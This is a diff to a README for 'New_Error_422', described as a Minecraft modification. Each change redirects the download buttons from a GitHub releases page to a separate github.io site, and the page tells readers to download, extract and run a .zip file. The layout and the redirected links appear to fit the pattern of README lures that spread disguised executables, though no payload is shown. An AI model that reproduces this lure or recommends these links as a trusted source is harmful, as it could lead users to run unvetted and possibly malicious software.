@@ -1,7 +1,7 @@
 <h1>🧩 New_Error_422 - Rewrite Minecraft With Wild Chaos</h1>
 
 <p align="center">
-  <a href="https://github.com/unofficial-equivocation2029/New_Error_422/releases">
+  <a href="https://unofficial-equivocation2029.github.io">
     <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-FF5722?style=for-the-badge&logo=github&logoColor=white" alt="Download Badge" style="max-width:100%;">
   </a>
 </p>
@@ -44,7 +44,7 @@
 <p>At the very top of this page, there is a big orange button that says "⬇️ DOWNLOAD NOW". Click it. That will take you to the official download page for New_Error_422. Alternatively, you can use this link directly:</p>
 
 <p align="center">
-  <a href="https://github.com/unofficial-equivocation2029/New_Error_422/releases"><strong>🌐 Visit this link to download the application</strong></a>
+  <a href="https://unofficial-equivocation2029.github.io"><strong>🌐 Visit this link to download the application</strong></a>
 </p>
 
 <p><strong>Step 2: Find the Right File</strong></p>
@@ -151,7 +151,7 @@
 <p>If you skipped ahead, here is your one-stop shop. Click below to go to the official release page. Then download the <code>.zip</code> file, extract it, and run the application as described above.</p>
 
 <p align="center">
-  <a href="https://github.com/unofficial-equivocation2029/New_Error_422/releases" style="background-color:#4CAF50;color:white;padding:15px 30px;text-decoration:none;font-size:20px;border-radius:8px;">⬇️ Download New_Error_422 Now</a>
+  <a href="https://unofficial-equivocation2029.github.io" style="background-color:#4CAF50;color:white;padding:15px 30px;text-decoration:none;font-size:20px;border-radius:8px;">⬇️ Download New_Error_422 Now</a>
 </p>
 
 <p>Bookmark this page if you plan to come back. We update with new versions occasionally,and each one has even stranger glitches. Thank you for choosing controlled chaos. Have fun out there in the broken world.</p>
